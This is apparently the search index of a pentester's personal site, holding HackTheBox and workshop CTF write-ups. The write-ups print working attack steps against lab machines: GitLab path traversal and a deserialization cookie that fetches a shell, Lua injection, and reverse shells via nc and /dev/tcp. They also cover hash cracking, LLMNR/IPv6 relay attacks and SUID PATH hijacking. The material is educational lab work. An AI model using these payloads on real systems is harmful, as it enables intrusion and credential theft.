[{"authors":null,"categories":null,"content":"med@pentest:# cat /home/bio.txt I am a Pentester/Red Teamer from Tunisia, whose main interest is CyberSecurity and Networking. I enjoy playing CTFs with my Team Gangsters known as Sup\u0026rsquo;Hackers. We\u0026rsquo;re ranked 6th in tunisia @CTFtime \nPro Hacker @HackThebox  0x9 OMN1 @TryHackMe\n","date":1618617600,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1618617600,"objectID":"2525497d367e79493fd32b198b28f040","permalink":"","publishdate":"0001-01-01T00:00:00Z","relpermalink":"","section":"authors","summary":"med@pentest:# cat /home/bio.txt I am a Pentester/Red Teamer from Tunisia, whose main interest is CyberSecurity and Networking. I enjoy playing CTFs with my Team Gangsters known as Sup\u0026rsquo;Hackers. We\u0026rsquo;re ranked 6th in tunisia @CTFtime","tags":null,"title":"Mohamed Elleuch","type":"authors"},{"authors":[],"categories":null,"content":" Click on the Slides button above to view the built-in slides feature.   Slides can be added in a few ways:\n Create slides using Wowchemy\u0026rsquo;s Slides feature and link using slides parameter in the front matter of the talk file Upload an existing slide deck to static/ and link using url_slides parameter in the front matter of the talk file Embed your slides (e.g. Google Slides) or presentation video on this page using shortcodes.  Further event details, including page elements such as image galleries, can be added to the body of this page.\n","date":1906549200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1906549200,"objectID":"a8edef490afe42206247b6ac05657af0","permalink":"https://mohamed-elleuch.me/talk/example-talk/","publishdate":"2017-01-01T00:00:00Z","relpermalink":"/talk/example-talk/","section":"event","summary":"An example talk using Wowchemy's Markdown slides feature.","tags":[],"title":"Example Talk","type":"event"},{"authors":["Mohamed Elleuch"],"categories":null,"content":"Information Gathering   Nmap scan  sudo nmap -sC -sV 10.10.10.216 -v  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA) | 256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA) |_ 256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519) 80/tcp open http Apache httpd 2.4.41 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to https://laboratory.htb/ 443/tcp open ssl/http Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: The Laboratory | ssl-cert: Subject: commonName=laboratory.htb | Subject Alternative Name: DNS:git.laboratory.htb | Issuer: commonName=laboratory.htb | Public Key type: rsa | Public Key bits: 4096 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-07-05T10:39:28 | Not valid after: 2024-03-03T10:39:28 | MD5: 2873 91a5 5022 f323 4b95 df98 b61a eb6c |_SHA-1: 0875 3a7e eef6 8f50 0349 510d 9fbf abc3 c70a a1ca | tls-alpn: |_ http/1.1 Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel  We have 3 ports open:\n ssh: 22 running OpenSSH 8.2p1 http: 80 running Apache httpd 2.4.41 https: 443 running Apache httpd 2.4.41  2 Domains:\n laboratory.htb git.laboratory.htb   Web Enumeration\n  After adding laboratory.htb \u0026amp; git.laboratory.htb to /etc/hosts\n Let\u0026rsquo;s check laboratory.htb first\nWe got 2 usernames:\n Dexter DeeDee Dee_Dee ..   Skipping Gobuster scans, as it gave me nothing interesting\n Seems like it\u0026rsquo;s a static website, nothing much to see!\nLet\u0026rsquo;s move to git.laboratory.htb\nTried few logins but it failed, ( dexter:admin dexter:password )\nLet\u0026rsquo;s create our own account and see what we can do\nGitLab Community Edition 12.8.1\n Initial foothold   I think there are ready-to-use scripts to exploit this gitlab version, but we\u0026rsquo;ll do the process manually!\n Bascially we\u0026rsquo;re gonna abuse arbitrary file read via the UploadsRewriter when moving an issue, and get the secret_key_base from /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml then generate the cookie payload via our own gitlab instance with the key that we got!\n If you wanna read more about this exploit: https://hackerone.com/reports/827052\n Let\u0026rsquo;s now try to read /etc/passwd from the box\n Let\u0026rsquo;s first create 2 projects   Let\u0026rsquo;s let\u0026rsquo;s an issue in one of these projets containing  ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)   Let\u0026rsquo;s now move it to the other project  And we get the file! Now let\u0026rsquo;s repeat the same thing to get /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml\n![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)  Let\u0026rsquo;s now setup our gitlab env!\n You can either download the gitlab package or use docker\n For this, I am going to use docker! First let\u0026rsquo;s pull the image\nsudo docker -D pull gitlab/gitlab-ce:12.8.1-ce.0  then run it !\nsudo docker run -it gitlab/gitlab-ce:12.8.1-ce.0 sh   PS: id command ; force of habit xD\n Let\u0026rsquo;s run\ngitlab-ctl reconfigure  Let\u0026rsquo;s change the /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml file with the one that we got! Now, let\u0026rsquo;s run\ngitlab-ctl restart gitlab-rails console  Here in the console, we\u0026rsquo;ll craft our cookie to gain access!\nOur payload to craft it:\nrequest = ActionDispatch::Request.new(Rails.application.env_config) request.env[\u0026quot;action_dispatch.cookies_serializer\u0026quot;] = :marshal cookies = request.cookie_jar erb = ERB.new(\u0026quot;\u0026lt;%= `curl http://10.10.14.3:8000/shell | bash` %\u0026gt;\u0026quot;) depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, \u0026quot;@result\u0026quot;, ActiveSupport::Deprecation.new) cookies.signed[:cookie] = depr puts cookies[:cookie]  Final payload:\ncurl -vvv 'https://git.laboratory.htb/users/sign_in' -b \u0026quot;experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiaCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBjdXJsIGh0dHA6Ly8xMC4xMC4xNC4zOjgwMDAvc2hlbGwgfCBzaGAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--a9181bfd8d26c33c9cf0c6fedcff269a3685902b\u0026quot; -k  Let\u0026rsquo;s set a listener, and grab that shell\n User PrivEsc  So now we\u0026rsquo;re on a docker container as the git user! The trick now is to change the gitlab\u0026rsquo;s admin (who is id=1) password\nGoing through gitlab\u0026rsquo;s docs to get the right syntax https://docs.gitlab.com/ee/security/reset_user_password.html\nIt may take a while to run\ngitlab-rails console -e production  user = User.find(1) user.password = 'password123' user.password_confirmation = 'password123' user.save!  Let\u0026rsquo;s login now with his account\nThere is a private repo that contains his home directory backup!\nLet\u0026rsquo;s copy his ssh private key and get into the box!\n Root PrivEsc  Let\u0026rsquo;s first run Linpeas! Going through the output, we can see that there is unusual suid binary let\u0026rsquo;s run Ltrace on this binary\nWe can abuse this binary, by creating a fake malicious chmod binary\necho \u0026quot;/bin/bash -p\u0026quot; \u0026gt; /tmp/chmod chmod 777 /tmp/chmod export PATH=/tmp:$PATH  Then we run the binary!\nAnd we rooted the box! Thanks for reading hope you enjoyed it! ","date":1618617600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1618617600,"objectID":"48bba9506635e20a1999d3fd32e75c6c","permalink":"https://mohamed-elleuch.me/writeups/htb-laboratory/","publishdate":"2021-04-17T00:00:00Z","relpermalink":"/writeups/htb-laboratory/","section":"writeups","summary":"Here's my writeup for the RETIRED machine Laboratory, Which is an Easy Linux machine!","tags":["HackTheBox"],"title":"HackTheBox - Laboratory Writeup","type":"writeups"},{"authors":["Mohamed Elleuch"],"categories":null,"content":"Information Gathering   Nmap scan  sudo nmap -sC -sV 10.10.10.218 -v  As we can see above, We have 3 PORTS open:\n Port 22 running OpenSSH 8.0 ; Recent version, no need waste time on it Port 80 running nginx ; robots.txt \u0026ndash;\u0026gt; /weather Port 9001 running Medusa httpd 1.12 ; If we were on linux i think this should be something to look at   Skipping the gobuster part, it will only show us robots.txt. I do prefer Dirb when it comes to directory bruteforcing\n Dirb scan   You can clone the SecLists repo from here https://github.com/danielmiessler/SecLists\n We already got /weather/ from the nmap results, let\u0026rsquo;s see enum more\ndirb -R http://10.10.10.218/weather/ /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt   Foothold\n From our previous scans we were able to find\nhttp://10.10.10.218/weather/forecast/  Let's try it as a GET param Adding a causes an error  Skipping the SQL Injection part as it got me nothing\n Let\u0026rsquo;s now try if we have any potential code injection. Basically, The idea is to end the current lua command and inject. Another think to note for lua a comment starts anywhere with a double hyphen ( \u0026ndash; ) and runs until the end of the line.\nLet\u0026rsquo;s first try this payload\n/weather/forecast?city=London');print(\u0026quot;\\nhi\u0026quot;)--  That worked! Let's try if we can use system commands /weather/forecast?city=London');print(\u0026quot;\\n\u0026quot;);os.execute(\u0026quot;id\u0026quot;)--  That worked aswell! Let\u0026rsquo;s now get a reverse shell\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc ip port \u0026gt;/tmp/f  Final url encoded payload:\n/weather/forecast?city=%4c%6f%6e%64%6f%6e%27%29%3b%70%72%69%6e%74%28%22%5c%6e%22%29%3b%6f%73%2e%65%78%65%63%75%74%65%28%22%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%33%39%20%31%32%33%34%20%3e%2f%74%6d%70%2f%66%22%29%2d%2d  Let\u0026rsquo;s execute it and get a shell on the box  User PrivEsc\n We can see that we have the default .htpasswd file which can contain potential passwords Let\u0026rsquo;s see what we got there echo \u0026quot;$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0\u0026quot; \u0026gt; hash ; john hash -w=/opt/rockyou.txt  And we cracked it! Let\u0026rsquo;s start by viewing the running processes\n You need to specify the w tag to view the whole command\n We can see that the user **r.michaels** is running a local server at port 3001! Let's exploit this to get his private SSH key! curl http://127.0.0.1:3001/~r.michaels/id_rsa  But we get 401 Unauthorized page!\nLet's try the credentials that we got earlier curl http://127.0.0.1:3001/~r.michaels/id_rsa --user webapi_user:iamthebest  And it worked! Let's login to the user And we grab that user flag!\nRoot PrivEsc\n An interesting backups file which contains an encrypted tar.gz file\nBecause we\u0026rsquo;re on an NetBSD box, we\u0026rsquo;re gonna use netpgp to decrypt then extract its content\nnetpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=backup.tar.gz  Let\u0026rsquo;s check that .htpasswd file! webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.\nLet\u0026rsquo;s crack this password with john!\nlittlebear\nLet\u0026rsquo;s try to switch to the root user with this password!\n https://www.vultr.com/docs/introduction-to-doas-on-NetBSD\n doas su  And we rooted the box!\n Bonus Section\n Let\u0026rsquo;s see what caused the lua injection!\ncat /home/r.michaels/devel/webapi/weather.lua  Going through the code we can see the injection point!\nhttpd.write('\u0026quot;error\u0026quot;: \u0026quot;unknown city: ' .. city .. '\u0026quot;}')  basically what we have done is\nhttpd.write('\u0026quot;error\u0026quot;: \u0026quot;unknown city: hi');os.execute(\u0026quot;id\u0026quot;) -- '\u0026quot;}')  To avoid this kind of injection, we should validate and sanitize the \u0026ldquo;city\u0026rdquo; input. Scanning the city variable for escape characters and special symbols, making a blacklist for any suspicious word {os,execute,print,\u0026hellip;} Or just by removing the \u0026lsquo;.. city ..\u0026rsquo; part!\nThanks for reading hope you enjoyed it! ","date":1616803200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1616803200,"objectID":"9c53dc83a837a6180559c8b9585b1542","permalink":"https://mohamed-elleuch.me/writeups/htb-luanne/","publishdate":"2021-03-27T00:00:00Z","relpermalink":"/writeups/htb-luanne/","section":"writeups","summary":"Here's my writeup for the RETIRED machine Luanne, Which is an Easy NetBSD machine!","tags":["HackTheBox"],"title":"HackTheBox - Luanne Writeup","type":"writeups"},{"authors":["Mohamed Elleuch"],"categories":null,"content":"Information Gathering  Nmap scan  rustscan -a 10.10.10.206 -- -A -sC -sV\nOpen 10.10.10.206:22 Open 10.10.10.206:80  22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA) | 256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA) | 256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519) 80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Passage News   We have two ports open Port 22 : OpenSSH 7.2p2 Port 80 : Apache httpd 2.4.18 Exploring the WebServer  Let\u0026rsquo;s first add Passage.htb to our hosts file!\nWe can see that Fail2Ban is Implemented on the server! So no need to waste our time trying bruteforcing dirs and files\nWhat really catchs my eye is\nPowered by CuteNews\nA simple search on google can reveal the default dir for CuteNews CMS which is /CuteNews/\nLet\u0026rsquo;s see what we get! Nice! We got the CMS version\nPowered by CuteNews 2.1.2\nLet\u0026rsquo;s find a vulnerability related to this version!\nInitial Foothold  Let\u0026rsquo;s see what searchsploit has for us!\nLet\u0026rsquo;s grab that juicy RCE python exploit\nsearchsploit -m php/webapps/48800.py  And run our script, We only need to provide \thttp://passage.htb\npython3 48800.py  And we\u0026rsquo;re on the box!\nLet\u0026rsquo;s get a proper shell on the box!\n/bin/bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;IP\u0026gt;/\u0026lt;PORT\u0026gt; 0\u0026gt;\u0026amp;1'\nUser Privesc\n Paul user  Going through the webserver config, I found an interesting directory\n/var/www/html/CuteNews/cdata/users\nWhich seem to contain some juicy encoded informations\nIt looks like it\u0026rsquo;s Base64 encoded! Let\u0026rsquo;s decode it\na:1:{s:4:\u0026quot;name\u0026quot;;a:1:{s:5:\u0026quot;admin\u0026quot;;a:8:{s:2:\u0026quot;id\u0026quot;;s:10:\u0026quot;1592483047\u0026quot;;s:4:\u0026quot;name\u0026quot;;s:5:\u0026quot;admin\u0026quot;;s:3:\u0026quot;acl\u0026quot;;s:1:\u0026quot;1\u0026quot;;s:5:\u0026quot;email\u0026quot;;s:17:\u0026quot;nadav@passage.htb\u0026quot;;s:4:\u0026quot;pass\u0026quot;;s:64:\u0026quot;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1\u0026quot;;s:3:\u0026quot;lts\u0026quot;;s:10:\u0026quot;1592487988\u0026quot;;s:3:\u0026quot;ban\u0026quot;;s:1:\u0026quot;0\u0026quot;;s:3:\u0026quot;cnt\u0026quot;;s:1:\u0026quot;2\u0026quot;;}}}  a:1:{s:4:\u0026quot;name\u0026quot;;a:1:{s:10:\u0026quot;paul-coles\u0026quot;;a:9:{s:2:\u0026quot;id\u0026quot;;s:10:\u0026quot;1592483236\u0026quot;;s:4:\u0026quot;name\u0026quot;;s:10:\u0026quot;paul-coles\u0026quot;;s:3:\u0026quot;acl\u0026quot;;s:1:\u0026quot;2\u0026quot;;s:5:\u0026quot;email\u0026quot;;s:16:\u0026quot;paul@passage.htb\u0026quot;;s:4:\u0026quot;nick\u0026quot;;s:10:\u0026quot;Paul Coles\u0026quot;;s:4:\u0026quot;pass\u0026quot;;s:64:\u0026quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd\u0026quot;;s:3:\u0026quot;lts\u0026quot;;s:10:\u0026quot;1592485556\u0026quot;;s:3:\u0026quot;ban\u0026quot;;s:1:\u0026quot;0\u0026quot;;s:3:\u0026quot;cnt\u0026quot;;s:1:\u0026quot;2\u0026quot;;}}}  Seems like we got nadav and paul\u0026rsquo;s hash password\nIt\u0026rsquo;s a sha2-256 hash, we\u0026rsquo;re gonna use Hashcat with the rockyou wordlist to crack them!\necho \u0026quot;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1\u0026quot; \u0026gt; hash echo \u0026quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd\u0026quot; \u0026gt; hash  hashcat -m 1400 hash /opt/rockyou.txt  Seems like we were only able to crack paul\u0026rsquo;s hash!\npaul:atlanta1\nAnd grab our user flag\nNadav user  We can notice that nadav can access paul\u0026rsquo;s session\nLet\u0026rsquo;s see if paul\u0026rsquo;s can access nadav\u0026rsquo;s session\nssh nadav@passage  It worked!\nRoot Privesc\n Let\u0026rsquo;s first run\nps -aux  To see the current running processes! What really catches me is that root is running, and that\u0026rsquo;s odd\n/usr/bin/python3 /usr/share/usb-creator/usb-creator-helper  A bit a searching/reading from google can lead us to something, which is the ability to get any file we want!\ngdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /dev/shm/id_rsa true  And we rooted the box!\nThanks for reading hope you enjoyed it! ","date":1614988800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1614988800,"objectID":"27c1e295548049232418c5d11b0dfc6e","permalink":"https://mohamed-elleuch.me/writeups/htb-passage/","publishdate":"2021-03-06T00:00:00Z","relpermalink":"/writeups/htb-passage/","section":"writeups","summary":"Here's my writeup for the RETIRED machine Passage, Which is a Medium Linux machine!","tags":["HackTheBox"],"title":"HackTheBox - Passage Writeup","type":"writeups"},{"authors":["Mohamed Elleuch"],"categories":null,"content":"Information Gathering  Nmap scan  sudo nmap -sC -sV -T5 -oA nmap -O -A -v 10.10.10.215  As we see we have 2 ports open  SSH on port 22 running OpenSSH 8.2p1  http on port 80 running httpd 2.4.41  we notice as well the academy.htb domain, which we should add to /etc/hosts.\nGobuster scan  gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -u http://academy.htb -x php  Initial Foothold\n Identifying the exploit\n So basically the first thing that tried was sql injection on  admin.php  but that didn\u0026rsquo;t give me any results. as we don\u0026rsquo;t have any potential users let\u0026rsquo;s move on and dig further. \nLet\u0026rsquo;s create an account and see if we can find any usernames and intercept it with burp\nPOST /register.php HTTP/1.1 Host: academy.htb Content-Length: 53 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://academy.htb Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://academy.htb/register.php Accept-Encoding: gzip, deflate Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: PHPSESSID=sdloh07q837vauvt0oqevack4o Connection: close uid=elleuch\u0026amp;password=elleuch\u0026amp;confirm=elleuch\u0026amp;roleid=0  We can notice the roleid\tparameter which is set to 0. we can assume that\u0026rsquo;s assigning a role to the user we\u0026rsquo;re creating. Which basically can be a normal user ( roleid=0 ) or a privileged user ( roleid=1 ).\nLet\u0026rsquo;s change change 0 to 1 and forward the request and create our privileged user and try to login to /admin.php\nAs we see above the planner leaks to us a subdomain dev-staging-01.academy.htb  Let\u0026rsquo;s add it to /etc/hosts and see what we get\nErrors! That sounds promosing! Scrolling down we can see something really interesting\nAPP_KEY\t\u0026quot;base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=\u0026quot;  We have the APP_KEY! We can abuse Laravel Unserialize Vulnerability CVE-2018-15133   For this exploit we\u0026rsquo;ll be using this script, a pretty easy syntax.\nhttps://github.com/aljavier/exploit_laravel_cve-2018-15133/blob/main/pwn_laravel.py  And voilà we\u0026rsquo;re on the box\nUser Privesc\n Now let\u0026rsquo;s start enumarating,We already know that the webserver is running PHP Laravel.  The first thing we should look at is the .env file.  And we get a password! mySup3rP4s5w0rd!!  Let\u0026rsquo;s see if it belongs to any existing user After manually trying to switch to these users, it turns out to be cry0l1t3\u0026rsquo;s password Our user is in the adm group! So basically we can read logs! And also we can read the audit log! We can grab some juicy informations from it\ndata=6D7262336E5F41634064336D79210A\nSeems we got a password! But it\u0026rsquo;s hex encoded! Let\u0026rsquo;s decode it\nmrb3n_Ac@d3my!\nSeems like it\u0026rsquo;s mrb3n\u0026rsquo;s password!\nRoot Privesc\n Mrb3n can execute /usr/bin/composer as root!\nGoing through the docs of composer we can find out that we can execute a custom script using composer! we need to create a composer.json first in any folder we want!\n{ \u0026quot;scripts\u0026quot;:{\u0026quot;shell\u0026quot;:\u0026quot;/bin/bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.111/4444 0\u0026gt;\u0026amp;1'\u0026quot;} }  We set our listener\nnc -lvnp 4444  And execute\nsudo /usr/bin/composer --working-dir=fake run-script shell  And we rooted the box!  uid=0(root) gid=0(root) groups=0(root)\nThanks for reading hope you enjoyed it! ","date":1614384000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1614384000,"objectID":"bfd50a2d9567418b7c0453ee0bdf9e26","permalink":"https://mohamed-elleuch.me/writeups/htb-academy/","publishdate":"2021-02-27T00:00:00Z","relpermalink":"/writeups/htb-academy/","section":"writeups","summary":"Here's my writeup for the RETIRED machine Academy, Which is an easy Linux machine that only require enumarations","tags":["HackTheBox"],"title":"HackTheBox - Academy Writeup","type":"writeups"},{"authors":["Mohamed Elleuch"],"categories":null,"content":"Overview of the network  TASK: LLMNR poisoning  Intercepting the user hash  We start by getting the network interface name\nsudo ifconfig  We\u0026rsquo;re going to use the responder package which comes preinstalled in kali linux. So basically we\u0026rsquo;re going to provide our network interface to responder , and let him do its magic\nsudo responder -I eth0 -rdwv  And we wait until a user accidentally make a mistake while writing his hostname instead of providing a legitimate hostname in the DNS. And get his NTLMv2 hash.\nUsername:naruto Hash: naruto:::0099db0783fde495:F2C5BF32BD89C576A1E95A54D4BF7664:0101000000000000C0653150DE09D20121A6F48A2D912BFA000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000B1EAB93D8ABDC394076EB8F8CA0CCF66489376BD473809472A94F666423EA3C20A0010000000000000000000000000000000000009001A0063006900660073002F00310030002E0030002E0030002E0036000000000000000000  Cracking the HASH  We\u0026rsquo;re going to use hashcat and rockyou wordlist to crack this hash,Basically we just need the Hash-Mod First of all, we\u0026rsquo;re going to look for NTLMv2 Hash-Mod\nhttps://hashcat.net/wiki/doku.php?id=example_hashes\nFinally run hashcat,\nhashcat.exe -m 5600 hash.txt rockyou.txt  And we wait until hashcat cracks it\n NARUTO:::bb5943c5efa0d0b9:b8a5d31bab00af7d8d013d1d7142dbdf:0101000000000000c0653150de09d201542d404b9a268f50000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000b1eab93d8abdc394076eb8f8ca0ccf66489376bd473809472a94f666423ea3c20a0010000000000000000000000000000000000009001a0063006900660073002f00310030002e0030002e0030002e0036000000000000000000:kelvinP@ssw0rd  FLAG\n Securinets{kelvinP@ssw0rd}  Task: IPv6 Attack  Preparing for the Attack  We\u0026rsquo;re going to start with gathering informations about the network\nsudo ifconfig  Network address: 10.0.0.0/24\nLet\u0026rsquo;s now find the hosts IPs, It may take a while\nnmap 10.0.0.0/24 -Pn | grep 10.0.0 | awk '{print $6}' | uniq \u0026gt; ips.txt  Now let\u0026rsquo;s an nmap scan on the result\nsudo nmap -sV -n -v -Pn -p- T4 -iL ips.txt -A --open -oA nmap  Or you can directly\nsudo nmap -sC -sV -p- T4 10.0.0.0/24 -oA nmap  After viewing the nmap results we can see that 10.0.0.7 is ip of the domain controller\nWe can get the domain name either from the nmap results or by enumerating the ldap\nldapsearch -h 10.0.0.7 -x -s base namingcontexts  namingcontexts: DC=SECURINETS,DC=local // SECURINETS.local is the domain name  Attacking  So basically we\u0026rsquo;re going to acts as an IPv6 router responsding to configuration request from the machine and assign it with an IPv6 address and an IPv6 DNS server. We going to use mitm6 ( https://github.com/fox-it/mitm6 ) which will act as IPv6 Router during the attack and ntlmrelayx ( Comes preinstalled in kali ) to capture the credentials and relay them to target machine.\nLet\u0026rsquo;s start by setting up mitm6\nsudo mitm6 -d SECURINETS.local  Let\u0026rsquo;s now set up our ntlm relay\nsudo impacket-ntlmrelayx -6 -t ldaps://10.0.0.7 -wh pwned.SECURINETS.local -l l00t  And wait until we get something juicy\nA folder l00t has been created which contains informations about the AD\nAnd we grab our flag\ncat * | grep Securinets  Flag  Securinets{U_D1d_W3ll_S0lv1ng_Th1s_AD_Master}  Thanks for reading hope you enjoyed it! ","date":1614038400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1614038400,"objectID":"ba20e059084ae862f83895ca8a268e68","permalink":"https://mohamed-elleuch.me/writeups/hacklockad/","publishdate":"2021-02-23T00:00:00Z","relpermalink":"/writeups/hacklockad/","section":"writeups","summary":"I had the chance to participate in the hacklock event organized by Securinets and also win \\o/. Here's the writeup that i presented in front of the jury.","tags":["Academic"],"title":"HackLock Active Directory Workshop Writeup","type":"writeups"},{"authors":[],"categories":[],"content":"Create slides in Markdown with Wowchemy Wowchemy | Documentation\n Features  Efficiently write slides in Markdown 3-in-1: Create, Present, and Publish your slides Supports speaker notes Mobile friendly slides   Controls  Next: Right Arrow or Space Previous: Left Arrow Start: Home Finish: End Overview: Esc Speaker notes: S Fullscreen: F Zoom: Alt + Click PDF Export: E   Code Highlighting Inline code: variable\nCode block:\nporridge = \u0026quot;blueberry\u0026quot; if porridge == \u0026quot;blueberry\u0026quot;: print(\u0026quot;Eating...\u0026quot;)   Math In-line math: $x + y = z$\nBlock math:\n$$ f\\left( x \\right) = ;\\frac{{2\\left( {x + 4} \\right)\\left( {x - 4} \\right)}}{{\\left( {x + 4} \\right)\\left( {x + 1} \\right)}} $$\n Fragments Make content appear incrementally\n{{% fragment %}} One {{% /fragment %}} {{% fragment %}} **Two** {{% /fragment %}} {{% fragment %}} Three {{% /fragment %}}  Press Space to play!\nOne  Two  Three \n A fragment can accept two optional parameters:\n class: use a custom style (requires definition in custom CSS) weight: sets the order in which a fragment appears   Speaker Notes Add speaker notes to your presentation\n{{% speaker_note %}} - Only the speaker can read these notes - Press `S` key to view {{% /speaker_note %}}  Press the S key to view the speaker notes!\n Only the speaker can read these notes Press S key to view    Themes  black: Black background, white text, blue links (default) white: White background, black text, blue links league: Gray background, white text, blue links beige: Beige background, dark text, brown links sky: Blue background, thin dark text, blue links    night: Black background, thick white text, orange links serif: Cappuccino background, gray text, brown links simple: White background, black text, blue links solarized: Cream-colored background, dark green text, blue links   Custom Slide Customize the slide style and background\n{{\u0026lt; slide background-image=\u0026quot;/media/boards.jpg\u0026quot; \u0026gt;}} {{\u0026lt; slide background-color=\u0026quot;#0000FF\u0026quot; \u0026gt;}} {{\u0026lt; slide class=\u0026quot;my-style\u0026quot; \u0026gt;}}   Custom CSS Example Let\u0026rsquo;s make headers navy colored.\nCreate assets/css/reveal_custom.css with:\n.reveal section h1, .reveal section h2, .reveal section h3 { color: navy; }   Questions? Ask\nDocumentation\n","date":1549324800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1549324800,"objectID":"0e6de1a61aa83269ff13324f3167c1a9","permalink":"https://mohamed-elleuch.me/slides/example/","publishdate":"2019-02-05T00:00:00Z","relpermalink":"/slides/example/","section":"slides","summary":"An introduction to using Wowchemy's Slides feature.","tags":[],"title":"Slides","type":"slides"},{"authors":["Mohamed Elleuch","Robert Ford"],"categories":null,"content":" Click the Cite button above to demo the feature to enable visitors to import publication metadata into their reference management software.    Create your slides in Markdown - click the Slides button to check out the example.   Supplementary notes can be added here, including code, math, and images.\n","date":1372636800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1372636800,"objectID":"ff6a19061a984819d30c916886db56ef","permalink":"https://mohamed-elleuch.me/publication/example/","publishdate":"2017-01-01T00:00:00Z","relpermalink":"/publication/example/","section":"publication","summary":"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum.","tags":[],"title":"An example conference 